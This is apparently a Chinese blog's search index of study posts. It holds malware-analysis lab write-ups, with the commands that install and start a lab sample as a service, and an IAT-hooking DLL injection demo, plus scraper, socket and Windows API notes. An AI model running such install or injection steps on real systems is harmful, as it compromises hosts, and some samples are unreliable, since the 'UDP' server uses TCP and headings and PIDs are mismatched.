<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[恶意代码分析实战：Lab03-02]]></title>
    <url>%2F2020%2F08%2F07%2F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%EF%BC%9ALab03-02%2F</url>
    <content type="text"><![CDATA[Lab 3-2使用动态分析技术来分析在Lab03-03.dll文件中发现的恶意代码 问题首先用PEID查看一下实验文件的导出表：可以发现，一共有5个导出函数，第二个和第三个从名称上看与服务相关。利用strings进行字符串查看：可以看到这里出现了svchost这个程序，它是一个宿主程序。DLL文件自身是不能够运行的，因此我们系统中的很多DLL就会依附svchost.exe这个程序上面。 1、你怎样才能让这个恶意代码自行安装？1C:\&gt; rundll32.exe Lab03-02.dll,installA 可以发现，Lab03-02.dll会添加一个名为IPRIP的服务；ImagePath后有一个svchost，说明恶意程序会在svchhost实现启动。 2、在安装之后，你如何让这个恶意代码运行起来？1C:\&gt; net start IPRIP 3、你怎么能找到这个恶意代码是在哪个进程下运行的？可以发现，Lab03-02.dll依附在了PID为1024的svchost.exe上。 4、你可以在procmon工具中设置什么样的过滤器，才能收集这个恶意代码的信息？在procmon中打开筛选器，然后添加PID为980的筛选条件。 5、这个恶意代码在主机上的感染迹象特征是什么？创建一个名为IPRIP的服务。 6、这个恶意代码是否存在一下有用的网络特征码？]]></content>
  </entry>
  <entry>
    <title><![CDATA[恶意代码分析实战：Lab03-01]]></title>
    <url>%2F2020%2F08%2F05%2F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%EF%BC%9ALab03-01%2F</url>
    <content type="text"><![CDATA[PEID检测首先用PEID进行基本检测：可以发现，这个程序加了壳。并且只调用了kernel32.dll，以及ExitProcess()这个API。接下来用strings这个程序查看一下它包含哪些可打印字符：可以发现，字符串中出现了一个网址和几个注册表的位置。恶意代码通常通过SOFTVARE\Microsoft\Windows\CurrentUsersion\Run注册表位置进行自启动。 感染特征启动Process Explorer、Process Monitor以及Wireshark，在Process Monitor筛选器中设置筛选条件，将Process Name设置为我们的实验文件的名称Lab03-01.exe，运行程序，可以看到Process Explorer已经监控到了Lab03-01.exe，通过Process Explorer可以发现，该程序创建了一个名为WinVMX32的互斥量。以及包含ws2_32.dll和wshtcpip.dll两个DLL文件，有互联网的一些操作。查看Process monitor，在Operation中选择WriteFile和RegSetValue，查看文件写入以及注册表写入：第一个Seed键值，一般用于随机数的生成。第二个监控结果，可以发现程序在系统目录中创建了一个名为vmx32to64.exe这样的一个程序，并且还包含有写入的操作。第三条监控结果则说明了程序添加了名为VideoDriver的自启动项。 网络特征码打开WireShark进行查看，可以发现一个DNS域名解析：它会尝试进行网络访问。然后发现几个SSL，查看数据，可以发现，每一个SSL的蓝色高亮部分都是不一样的，其大小为256个字节，可以认为这部分的数据内容其实是随机的，定期发送，不断进行广播：]]></content>
  </entry>
  <entry>
    <title><![CDATA[Python爬虫]]></title>
    <url>%2F2020%2F07%2F19%2FPython%E7%88%AC%E8%99%AB%2F</url>
    <content type="text"><![CDATA[1、爬取豆瓣Top250电影123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#------------------------------------# !/usr/bin/env python# -*- encoding: utf-8 -*-# @FileName : 豆瓣Top250.py# @Author : 嘿嘿嘿# @Time : 2020/7/19 0:11# @Software : PyCharm#------------------------------------from bs4 import BeautifulSoup #网页解析，获取数据import re #正则表达式，进行文字匹配import urllib.request,urllib.error #指定URL，获取网页数据import xlwt #进行excel操作import sqlite3 #进行数据库操作def main(): baseurl = &quot;https://movie.douban.com/top250?start=&quot; datalist = getData(baseurl) savepath = &quot;.\\豆瓣电影Top250.xls&quot; saveDate(datalist, savepath)# 获取网页def getData(baseurl): datalist = [] for i in range(0, 10): url = baseurl + str(i*25) html = askURL(url) soup = BeautifulSoup(html, &apos;html.parser&apos;) for item in soup.find_all(&apos;div&apos;,class_=&quot;item&quot;): data = [] item = str(item) id = re.findall(&apos;&lt;em class=&quot;&quot;&gt;(.*)&lt;/em&gt;&apos;, item)[0] title = re.findall(r&apos;&lt;span class=&quot;title&quot;&gt;(.*)&lt;/span&gt;&apos;, item)[0] link = re.findall(r&apos;&lt;a href=&quot;(.*)&quot;&gt;&apos;, item)[0] rating_num = re.findall(r&apos;&lt;span class=&quot;rating_num&quot; property=&quot;v:average&quot;&gt;(.*)&lt;/span&gt;&apos;, item)[0] people = re.findall(r&apos;&lt;span&gt;(.*人评价)&lt;/span&gt;&apos;, item)[0] data.append(id) data.append(title) data.append(rating_num) data.append(link) data.append(people) datalist.append(data) print(datalist) return datalistdef askURL(url): head = &#123; &quot;user-agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&quot; &#125; request = urllib.request.Request(url, headers=head) html = &apos;&apos; try: response = urllib.request.urlopen(request) html = response.read().decode(&apos;utf-8&apos;) #print(html) except urllib.error.URLError as e: if hasattr(e, &apos;code&apos;): print(e.code) if hasattr(e, &apos;reason&apos;): print(e.reason) return html# 保存数据def saveDate(datalist, savepath): workbook = xlwt.Workbook(encoding=&apos;utf-8&apos;, style_compression=0) worksheet = workbook.add_sheet(&apos;sheet1&apos;, cell_overwrite_ok=True) col = (&quot;电影排名&quot;, &quot;电影名称&quot;, &quot;电影评分&quot;, &quot;评价人数&quot;) for i in range(0, 4): worksheet.write(0, i, col[i]) for i in range(0,250): for j in range(0,5): worksheet.write(i+1,j,datalist[i][j]) workbook.save(&apos;豆瓣Top250.xls&apos;)if __name__ == &quot;__main__&quot;: 2、爬取江西高考投档线1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#------------------------------------# !/usr/bin/env python# -*- encoding: utf-8 -*-# @FileName : 江西高考投档线.py# @Author : 嘿嘿嘿# @Time : 2020/7/19 14:49# @Software : PyCharm#------------------------------------from bs4 import BeautifulSoup #网页解析，获取数据import re #正则表达式，进行文字匹配import urllib.request,urllib.error #指定URL，获取网页数据import xlwt #进行excel操作def main(): baseurl = &quot;https://www.dxsbb.com/news/58588.html&quot; datalist = getData(baseurl) saveDate(datalist)# 获取网页def getData(baseurl): title_col = [[&apos;序号&apos;], [&apos;科类&apos;], [&apos;院校代号&apos;], [&apos;院校名称&apos;], [&apos;投档线&apos;], [&apos;最低投档排名&apos;]] datas = [&apos;&apos;] datalist = [] html = askURL(baseurl) soup = BeautifulSoup(html, &apos;html.parser&apos;) for item in soup.find_all(&apos;td&apos;, style=&quot;text-align:center;&quot;): item = str(item).strip() data = re.findall(r&apos;&lt;td style=&quot;text-align:center;&quot;&gt;(.*)&lt;/td&gt;&apos;, item) data = str(data) data = re.sub(r&quot;&lt;a class=.keyWord. href=.../news/list_...?.html. target=._blank.&gt;&quot;, &apos;&apos;, data) data = re.sub(r&quot;&lt;/a&gt;&quot;, &apos;&apos;, data) data = str(data).strip(&quot;[&apos;&quot;) data = str(data).strip(&quot;&apos;]&quot;) print(data) datas.append(data) if len(datas)%6 == 0: datas = [] datalist.append(datas) datalist[0] = title_col datalist.pop() return datalistdef askURL(url): head = &#123; &quot;user-agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&quot; &#125; request = urllib.request.Request(url, headers=head) html = &apos;&apos; try: response = urllib.request.urlopen(request) html = response.read().decode(&apos;gbk&apos;) except urllib.error.URLError as e: if hasattr(e, &apos;code&apos;): print(e.code) if hasattr(e, &apos;reason&apos;): print(e.reason) return html# 保存数据def saveDate(datalist): workbook = xlwt.Workbook(encoding=&apos;utf-8&apos;, style_compression=0) worksheet = workbook.add_sheet(&apos;sheet1&apos;, cell_overwrite_ok=True) for i in range(0, len(datalist)): for j in range(0, 6): worksheet.write(i, j, datalist[i][j]) workbook.save(&apos;2019江西高考二本投档线.xls&apos;)if __name__ == &quot;__main__&quot;:]]></content>
  </entry>
  <entry>
    <title><![CDATA[Python网络编程]]></title>
    <url>%2F2020%2F06%2F08%2FPython%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[1、socket()模块函数要创建套接字，必须使用socket.socket()函数，它的语法如下： 1socket（socket_family, socket_type, protocol = 0） 其中，socket_family是AF_UNIX（基于文件）或AF_INET（基于网络）,socket_type是SCOKET_STREAM（TCP）或SOCKET_DGRAM（UDP）。 1tcpSock = socket(AF_INET, SOCK_STREAM/SOCKET_DGRAM) 2、套接字对象方法1、服务器套接字方法 2、客户端套接字方法 3、普通的套接字方法名称 描述 s.recv() 接受TCP消息 s.recv_into() 接受TCP消息到指定的缓冲区 s.send() 发送TCP消息 s.sendall() 完整的发送TCP消息 s.recvfrom() 接受UDP消息 s.recvfrom_into() 接受UDP消息到指定缓冲区 s.sendto() 发送UDP消息 s.getpeername() 连接到套接字（TCP）的远程地址 s.getsockname() 当前套接字地址 s.getsockopt() 返回给定套接字选项的值 s.setsockopt() 设置给定套接字选项的值 s.shutdown() 关闭连接 s.close() 关闭套接字 s.detach() 在未关闭文件描述符的情况下关闭套接字，返回文件描述符 s.ioctl() 控制套接字的模式（仅window）4、面向阻塞的套接字方法 5、面向文件的套接字方法 3、TCP1、tcp服务端1234567891011121314151617181920212223242526from socket import *from time import ctimeHOST = &apos;&apos;PORT = 21567BUFSIZ = 1024ADDR = (HOST, PORT)tcpSerSock = socket(AF_INET, SOCK_STREAM) #创建TCP套接字tcpSerSock.bind(ADDR)tcpSerSock.listen(5)while True: print(&apos;waiting for connection...&apos;) tcpCliSock, addr = tcpSerSock.accept() #被动接受TCP客户端连接 print(&apos;...connected from:&apos;, addr) while True: data = tcpCliSock.recv(BUFSIZ).decode() #接受TCP消息 if not data: break #tcpCliSock.send(&apos;[%s] %s&apos; % (bytes(ctime(), &apos;utf-8&apos;), data)) tcpCliSock.send(bytes((&apos;[%s] %s&apos; % (ctime(), data)).encode())) tcpCliSock.close()tcpSerSock.close() 2、tcp客户端123456789101112131415161718192021from socket import *HOST = &apos;127.0.0.1&apos;PORT = 21567BUFSIZ = 1024ADDR = (HOST, PORT)tcpCliSock = socket(AF_INET, SOCK_STREAM)tcpCliSock.connect(ADDR) #主动发起TCP服务器连接while True: data = input(&apos;&gt; &apos;) if not data: break tcpCliSock.send(data.encode()) #发送TCP消息 data = tcpCliSock.recv(BUFSIZ).decode() #接受TCP消息 if not data: break print(data)tcpCliSock.close() 4、UDP1、udp服务端1234567891011121314151617181920212223242526from socket import *from time import ctimeHOST = &apos;&apos;PORT = 21568BUFSIZ = 1024ADDR = (HOST, PORT)tcpSerSock = socket(AF_INET, SOCK_STREAM)tcpSerSock.bind(ADDR)tcpSerSock.listen(5)while True: print(&apos;waiting for connection...&apos;) tcpCliSock, addr = tcpSerSock.accept() print(&apos;...connected from:&apos;, addr) while True: data = tcpCliSock.recv(BUFSIZ).decode() if not data: break #tcpCliSock.send(&apos;[%s] %s&apos; % (bytes(ctime(), &apos;utf-8&apos;), data)) tcpCliSock.send(bytes((&apos;[%s] %s&apos; % (ctime(), data)).encode())) tcpCliSock.close()tcpSerSock.close() 2、udp客户端1234567891011121314151617181920from socket import *HOST = &apos;127.0.0.1&apos;PORT = 21567BUFSIZ = 1024ADDR = (HOST, PORT)udpCliSock = socket(AF_INET, SOCK_DGRAM)while True: data = input(&apos;&gt; &apos;) if not data: break udpCliSock.sendto(data.encode(), ADDR) data, ADDR = udpCliSock.recvfrom(BUFSIZ) if not data: break print (data.decode())udpCliSock.close()]]></content>
  </entry>
  <entry>
    <title><![CDATA[SEH和VEH]]></title>
    <url>%2F2020%2F06%2F04%2FSEH%E5%92%8CVEH%2F</url>
    <content type="text"><![CDATA[SEH（Structured Exception Handling，结构化异常处理）是window操作系统默认的异常处理机制，逆向分析中，SEH除了基本的异常处理功能外，还大量用于反调试程序。 1、SEH的相关数据结构1、TIB结构TIB（Thread Information Block，线程信息块）是保存线程基本信息的数据结构。在用户模式下，它位于TEB（Thread Environment Block，线程环境块）的头部，而TEB是操作系统为了保存每个线程的私有数据创建的，每个线程都有自己的TEB。TIB定义： 12345678910111213typedef struct _NT_TIB&#123; struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList;//指向异常处理链表 PVOID StackBase;//当前线程所使用的栈的栈底 PVOID StackLimit;//当前线程所使用的栈的栈顶 PVOID SubSystemTib; union &#123; PVOID FiberData; DWORD Version; &#125;; PVOID ArbitraryUserPointer; struct _NT_TIB *Self;//指向TIB结构自身&#125; NT_TIB;typedef NT_TIB *PNT_TIB; 2、_EXCEPTION_REGISTRATION_RECORD结构TEB偏移量为0的_EXCEPTION_REGISTRATION_RECORD主要用于描述线程异常处理过程的地址，多个该结构体的链表描述了多个线程异常处理过程的嵌套层次关系，定义如下： 123456struct EXCEPTION_REGISTRATION_RECORDtypedef struct _EXCEPTION_REGISTRATION_RECORD&#123; PEXCEPTION_REGISTRATION_RECORD Next;//指向下一个结构的指针 PEXCEPTION_DISPOSITION Handler;//当前异常处理回调函数的地址&#125; EXCEPTION_REGISTRATION_RECORD, *PEXCEPTION_REGISTRATION_RECORD; 3、EXCEPTION_DISPOSITION结构由系统调用，是一个回调函数，第一个参数是一个指向EXCEPTION_RECORD结构体的指针 123456EXCEPTION_DISPOSITION __cdecl _except_handler ( EXCEPTION_RECORD *pRecord, EXCEPTION_REGISTRATION_RECORD *pFrame, CONTEXT *pContext, PVOID pValue); 4、EXCEPTION_RECORD结构异常处理函数的第三个参数是指向CONTEXT结构体的指针，CONTEXT结构体用来备份CPU的值。 12345678typedef struct _EXCEPTION_RECORD &#123; DWORD ExceptionCode; //异常代码 DWORD ExceptionFlags; struct _EXCEPTION_RECORD *ExceptionRecord; PVOID ExceptionAddress; //异常发生地址 DWORD NumberParameters; ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];&#125; EXCEPTION_RECORD; 异常发生的时候，执行异常代码的线程就会发生中断，转而运行SEH，此时操作系统会把线程CONTEXT结构体的指针传递给异常处理函数的相应参数。里面有个eip成员，在异常处理函数中将参数传递过来的CONTEXT.eip设置为其他地址，然后返回处理函数。这样之前暂停的线程会执行新的EIP地址处的代码。 2、VEH向量化异常处理的基本概念和SEH相同，也是注册一个回调函数，当发生异常时会被系统的异常处理过程调用。 123456789WINBASEAPI PVOID WINAPI AddVectoreExceptionHandler ( ULONG FirstHandler; PVECTORED_EXCEPTION_HANDLER VectoreHandler//回调函数地址);//回调函数原型LONG CALLBACK VectoredHandler ( PEXCEPTION_POINTERS ExceptionInfo); VEH回调函数也形成一个链表。若参数FirstHandler的值为0，则回调函数位于VEH链表的尾部；若参数FirstHandler为非零值，则置于VEH链表的头部。VEH回调函数所在的模块被卸载之后，系统不能自动将回调函数从VEH链表上移除，需要程序在退出前自己完成卸载工作。 123ULONG RemoveVectoreExceptionHandler ( POVID VectoreHandlerHandle); VectoreHandlerHandle为AddVectoreExceptionHandler的返回值。 123456789101112131415161718192021222324252627282930#include &quot;stdafx.h&quot;#define _WIN32_WINNT 0x502#include &lt;windows.h&gt;char szTit[]=&quot;design : achillis XP+&quot;;DWORD validADDR;LONG WINAPI VectExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)&#123; PCONTEXT pContext=ExceptionInfo-&gt;ContextRecord; pContext-&gt;Eax=(DWORD)&amp;validADDR; return EXCEPTION_CONTINUE_EXECUTION;&#125;int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR CmdLine,int nCmdShow)&#123; PVOID handle = AddVectoredExceptionHandler(TRUE, VectExceptionHandler); __asm &#123; xor eax,eax mov [eax],5 //向0地址写入数据，引发内存访问异常 &#125; MessageBox(0,&quot;We SUC recovering from Write Acess!&quot;,szTit,MB_ICONINFORMATION); RemoveVectoredExceptionHandler(handle); return 0;&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[APK文件结构]]></title>
    <url>%2F2020%2F06%2F02%2FAPK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%2F</url>
    <content type="text"><![CDATA[1、APK文件结构apk文件，即Android application package文件。每个要安装到Android平台的应用都要被编译打包为一个单独的文件，后缀名为.apk，其中包含了应用的二进制代码、资源、配置文件等。APK文件其实是zip格式，但后缀名被修改为apk，在Android 系统安装时，APK程序会被存放在系统默认的APP 目录中。 assets目录：存放需要打包到APK中的静态文件 lib目录：程序依赖的native库 res目录：存放应用程序的资源 META-INF目录：存放应用程序签名和证书的目录 AndroidManifest.xml：应用程序的配置文件 classes.dex：dex可执行文件 resources.arsc：资源配置文件1、assets目录用于存放需要打包到APK中的静态文件，和res的不同点在于，assets目录支持任意深度的子目录，用户可以根据自己的需求任意部署文件夹架构，而且res目录下的文件会在.R文件中生成对应的资源ID，assets不会自动生成对应的ID，访问的时候需要AssetManager类。 2、lib目录这里存放应用程序依赖的native库文件，一般是用C/C++编写，这里的lib库可能包含4中不同类型，根据CPU型号的不同，大体可以分为ARM，ARM-v7a，MIPS，X86，分别对应着ARM架构，ARM-V7架构，MIPS架构和X86架构，这些so库在APK包中的构成如下图： 3、res目录res是resource的缩写，这个目录存放资源文件，存在这个文件夹下的所有文件都会映射到Android工程的.R文件中，生成对应的ID，访问的时候直接使用资源ID即R.id.filename，res文件夹下可以包含多个文件夹，其中anim存放动画文件；drawable目录存放图像资源；layout目录存放布局文件；values目录存放一些特征值，colors.xml存放color颜色值，dimens.xml定义尺寸值，string.xml定义字符串的值，styles.xml定义样式对象；xml文件夹存放任意xml文件，在运行时可以通过Resources.getXML()读取；raw是可以直接复制到设备中的任意文件，他们无需编译。 4、META-INF目录保存应用的签名信息，签名信息可以验证APK文件的完整性。AndroidSDK在打包APK时会计算APK包中所有文件的完整性，并且把这些完整性保存到META-INF文件夹下，应用程序在安装的时候首先会根据META-INF文件夹校验APK的完整性，这样就可以保证APK中的每一个文件都不能被篡改。以此来确保APK应用程序不被恶意修改或者病毒感染，有利于确保Android应用的完整性和系统的安全性。META-INF目录下包含的文件有CERT.RSA，CERT.DSA，CERT.SF和MANIFEST.MF，其中CERT.RSA是开发者利用私钥对APK进行签名的签名文件，CERT.SF，MANIFEST.MF记录了文件中文件的SHA-1哈希值。 5、AndroidManifest.xmlAndroid应用程序的配置文件，是一个用来描述Android应用“整体资讯”的设定文件，简单来说，相当于Android应用向Android系统“自我介绍”的配置文件，Android系统可以根据这个“自我介绍”完整地了解APK应用程序的资讯，每个Android应用程序都必须包含一个AndroidManifest.xml文件，且它的名字是固定的，不能修改。我们在开发Android应用程序的时候，一般都把代码中的每一个Activity，Service，Provider和Receiver在AndroidManifest.xml中注册，只有这样系统才能启动对应的组件，另外这个文件还包含一些权限声明以及使用的SDK版本信息等等。程序打包时，会把AndroidManifest.xml进行简单的编译，便于Android系统识别，编译之后的格式是AXML格式，如图所示： 6、classes.dex传统的Java程序，首先先把Java文件编译成class文件，字节码都保存在了class文件中，Java虚拟机可以通过解释执行这些class文件。而Dalvik虚拟机是在Java虚拟机进行了优化，执行的是Dalvik字节码，而这些Dalvik字节码是由Java字节码转换而来，一般情况下，Android应用在打包时通过AndroidSDK中的dx工具将Java字节码转换为Dalvik字节码。dx工具可以对多个class文件进行合并，重组，优化，可以达到减小体积，缩短运行时间的目的。 7、resources.arsc用来记录资源文件和资源ID之间的映射关系，用来根据资源ID寻找资源。Android的开发是分模块的，res目录专门用来存放资源文件，当在代码中需要调用资源文件时，只需要调用findviewbyId()就可以得到资源文件，每当在res文件夹下放一个文件，aapt就会自动生成对应的ID保存在.R文件，我们调用这个ID就可以，但是只有这个ID还不够，.R文件只是保证编译程序不报错，实际上在程序运行时，系统要根据ID去寻找对应的资源路径，而resources.arsc文件就是用来记录这些ID和资源文件位置对应关系的文件。 2、APK安装流程1、复制APK到/data/app目录下，解压并扫描安装包。 2、资源管理器解析APK里的资源文件。 3、解析AndroidManifest文件，并在/data/data/44、目录下创建对应的应用数据目录。 5、然后对dex文件进行优化（odex），并保存在dalvik-cache目录下。 6、将AndroidManifest文件解析出的四大组件信息注册到PackageManagerService中。 7、安装完成后，发送广播。]]></content>
  </entry>
  <entry>
    <title><![CDATA[线程与进程]]></title>
    <url>%2F2020%2F05%2F31%2F%E7%BA%BF%E7%A8%8B%E4%B8%8E%E8%BF%9B%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[1、创建线程123456789101112BOOL CreateProcess( LPCTSTR lpApplicationName, // pointer to name of executable module LPTSTR lpCommandLine, // pointer to command line string LPSECURITY_ATTRIBUTES lpProcessAttributes, // pointer to process security attributes LPSECURITY_ATTRIBUTES lpThreadAttributes, // pointer to thread security attributes BOOL bInheritHandles, // handle inheritance flag DWORD dwCreationFlags, // creation flags LPVOID lpEnvironment, // pointer to new environment block LPCTSTR lpCurrentDirectory, // pointer to current directory name LPSTARTUPINFO lpStartupInfo, // pointer to STARTUPINFO LPPROCESS_INFORMATION lpProcessInformation // pointer to PROCESS_INFORMATION); lpApplicationName: 指向一个NULL结尾的、用来指定可执行模块的字符串。这个字符串可以是可执行模块的绝对路径，也可以是相对路径，在后一种情况下，函数使用当前驱动器和目录建立可执行模块的路径。这个参数可以被设为NULL，在这种情况下，可执行模块的名字必须处于 lpCommandLine 参数最前面并由空格符与后面的字符分开。 lpCommandLine: 指向一个以NULL结尾的字符串，该字符串指定要执行的命令行。这个参数可以为空，那么函数将使用lpApplicationName参数指定的字符串当做要运行的程序的命令行。 lpProcessAttributes: 指向一个SECURITY_ATTRIBUTES结构体，这个结构体决定是否返回的句柄可以被子进程继承。如果lpProcessAttributes参数为空（NULL），那么句柄不能被继承。 lpThreadAttributes: 同lpProcessAttribute,不过这个参数决定的是线程是否被继承.通常置为NULL. bInheritHandles: 指示新进程是否从调用进程处继承了句柄。如果参数的值为真，调用进程中的每一个可继承的打开句柄都将被子进程继承。被继承的句柄与原进程拥有完全相同的值和访问权限。 dwCreationFlags：指定附加的、用来控制优先类和进程的创建的标志。以下的创建标志可以以除下面列出的方式外的任何方式组合后指定。 ⑴值：CREATE_DEFAULT_ERROR_MODE：新的进程不继承调用进程的错误模式。 ⑵值：CREATE_NEW_CONSOLE：新的进程将使用一个新的控制台，而不是继承父进程的控制台。这个标志不能与DETACHED_PROCESS标志一起使用。 ⑶值：CREATE_NEW_PROCESS_GROUP：新进程将是一个进程树的根进程。 ⑷值：CREATE_SEPARATE_WOW_VDM： 如果被设置，新进程将会在一个私有的虚拟DOS机（VDM）中运行。 ⑸值：CREATE_SHARED_WOW_VDM： 如果WIN.INI中的Windows段的DefaultSeparateVDM选项被设置为真，这个标识使得CreateProcess函数越过这个选项并在共享的虚拟DOS机中运行新进程。 ⑹值：CREATE_SUSPENDED：新进程的主线程会以暂停的状态被创建，直到调用ResumeThread函数被调用时才运行。 ⑺值：CREATE_UNICODE_ENVIRONMENT：如果被设置，由lpEnvironment参数指定的环境块使用Unicode字符，如果为空，环境块使用ANSI字符。 ⑻值：DEBUG_PROCESS：如果这个标志被设置，调用进程将被当做一个调试程序，并且新进程会被当做被调试的进程。系统把被调试程序发生的所有调试事件通知给调试器。 ⑼值：DEBUG_ONLY_THIS_PROCESS：如果此标志没有被设置且调用进程正在被调试，新进程将成为调试调用进程的调试器的另一个调试对象。如果调用进程没有被调试，有关调试的行为就不会产生。 ⑽值：DETACHED_PROCESS：对于控制台进程，新进程没有访问父进程控制台的权限。新进程可以通过AllocConsole函数自己创建一个新的控制台。这个标志不可以与CREATE_NEW_CONSOLE标志一起使用。 (11)值：CREATE_NO_WINDOW：系统不为新进程创建CUI窗口，使用该标志可以创建不含窗口的CUI程序。 dwCreationFlags参数：用来控制新进程的优先类，优先类用来决定此进程的线程调度的优先级。 可以选择下面的标志中的一个： 优先级：HIGH_PRIORITY_CLASS：指示这个进程将执行时间临界的任务，所以它必须被立即运行以保证正确。这个优先级的程序优先于正常优先级或空闲优先级的程序。 优先级：IDLE_PRIORITY_CLASS：指示这个进程的线程只有在系统空闲时才会运行并且可以被任何高优先级的任务打断。例如屏幕保护程序。空闲优先级会被子进程继承。 优先级：NORMAL_PRIORITY_CLASS：指示这个进程没有特殊的任务调度要求。 优先级：REALTIME_PRIORITY_CLASS：指示这个进程拥有可用的最高优先级。一个拥有实时优先级的进程的线程可以打断所有其他进程线程的执行，包括正在执行重要任务的系统进程。 lpEnvironment：指向一个新进程的环境块。如果此参数为空，新进程使用调用进程的环境。 lpCurrentDirectory：指向一个以NULL结尾的字符串，这个字符串用来指定子进程的工作路径。这个字符串必须是一个包含驱动器名的绝对路径。如果这个参数为空，新进程将使用与调用进程相同的驱动器和目录。 lpStartupInfo：指向一个用于决定新进程的主窗体如何显示的STARTUPINFO结构体。 lpProcessInformation：指向一个用来接收新进程的识别信息的PROCESS_INFORMATION结构体。2、创建进程12345678HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, // pointer to thread security attributes DWORD dwStackSize, // initial thread stack size, in bytes LPTHREAD_START_ROUTINE lpStartAddress, // pointer to thread function LPVOID lpParameter, // argument for new thread DWORD dwCreationFlags, // creation flags LPDWORD lpThreadId // pointer to returned thread identifier); lpThreadAttrivutes：指向SECURITY_ATTRIBUTES的指针，用于定义新线程的安全属性，一般设置成NULL； dwStackSize：分配以字节数表示的线程堆栈的大小，默认值是0； lpStartAddress：指向一个线程函数地址。每个线程都有自己的线程函数，线程函数是线程具体的执行代码； lpParameter：传递给线程函数的参数； dwCreationFlags：表示创建线程的运行状态，其中CREATE_SUSPEND表示挂起当前创建的线程，而0表示立即执行当前创建的进程； lpThreadID：返回新创建的线程的ID编号；123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;DWORD WINAPI ThreadProc(LPVOID lpParameter)&#123; int i; for(i = 0; i &lt; 100; i++) &#123; Sleep(500); printf(&quot;++++++++++++++++%d \n&quot;, i); &#125; return 0;&#125;int main()&#123; int i; HANDLE hThread; hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); CloseHandle(hThread); for(i = 0; i &lt; 100; i++) &#123; Sleep(500); printf(&quot;----------------%d \n&quot;, i); &#125; return]]></content>
  </entry>
  <entry>
    <title><![CDATA[函数调用约定]]></title>
    <url>%2F2020%2F05%2F25%2F%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A%2F</url>
    <content type="text"><![CDATA[1、cdeclcdecl是主要在C语言中使用的方式，使用ADD ESP，X的方式整理堆栈。 2、stdcallstdcall方式常用于Win32 API，栈清理由RETN X进行。 3、fastcallfastcall与stdcall类似，但是它会用到ecx、edx进行传参。]]></content>
  </entry>
  <entry>
    <title><![CDATA[IAT HOOK]]></title>
    <url>%2F2020%2F05%2F14%2FIAT%20HOOK%2F</url>
    <content type="text"><![CDATA[1、IAT钩取工作原理进程的IAT中保存着程序中调用的API的地址，IAT钩取通过修改IAT中保存的API地址来钩取某个API。图中描述的是计算器（calc.exe）进程正常调用user32.SetWindowTextW()API的情形。地址01001110属于IAT区域，程序开始运行时，PE装载器会将user32.SetWindowTextW()API地址（77D0960E）记录到该地址（01001110）。01002628地址处的CALL DWORD PTR [01001110]指令最终会调用保存在01001110地址（77D0960E）处的函数，直接等同于CALL 77D0960E命令。执行完地址01002628处的CALL命令后，运行将转移到user32.SetWindowTextW()函数的起始地址（77D0960E）处，执行完user32.SetWindowTextW()后返回。下图是IAT被钩取后计算器进程的运行过程。hookiat.dll文件中通过了了名为MySetWindowTextW()的钩取函数（10001000）。地址01002628处的CALL指令执行后，会跟踪进入10001000，而不是01001110。经过一系列的处理后，执行1000107D处的CALL命令，转到原user32.SetWindowTextW()函数的起始地址。user32.SetWindowTextW()API执行完毕后，执行会返回到hookiat.dll的1000107D地址的下雨天指令，然后返回到01002628地址的下一条指令继续执行。 2、演示示例（1）calc.exe（2）hookiat.dll（3）InjectDll.exe 12InjectDll.exe i pID hookiat.dll //钩取命令InjectDll.exe e pID hookiat.dll //脱钩命令 钩取后程序运行的样子： 3、源代码分析1、DllMain()1234567891011121314151617181920212223BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123; switch( fdwReason ) &#123; case DLL_PROCESS_ATTACH : // 保存原始API地址 g_pOrgFunc = GetProcAddress(GetModuleHandle(L&quot;user32.dll&quot;), &quot;SetWindowTextW&quot;); // # hook // 用hookiat.MySetWindowText()钩取user32.SetWindowTextW() hook_iat(&quot;user32.dll&quot;, g_pOrgFunc, (PROC)MySetWindowTextW); break; case DLL_PROCESS_DETACH : // # unhook // 将IAT恢复 hook_iat(&quot;user32.dll&quot;, (PROC)MySetWindowTextW, g_pOrgFunc); break; &#125; return TRUE;&#125; 2、MySetWindowTextW()1234567891011121314151617181920BOOL WINAPI MySetWindowTextW(HWND hWnd, LPWSTR lpString)&#123; wchar_t* pNum = L&quot;零一二三四五六七八九&quot;; wchar_t temp[2] = &#123;0,&#125;; int i = 0, nLen = 0, nIndex = 0; nLen = wcslen(lpString); for(i = 0; i &lt; nLen; i++) &#123; // 将阿拉伯数字转换为中文数字 if( L&apos;0&apos; &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= L&apos;9&apos; ) &#123; temp[0] = lpString[i]; nIndex = _wtoi(temp); lpString[i] = pNum[nIndex]; &#125; &#125; // 调用user32.SetWindowTextW()API return ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);&#125; SetWindowTextW()API定义如下： 1234BOOL SetWindowTextW( HWND hwnd, LPCTSTR lpString); 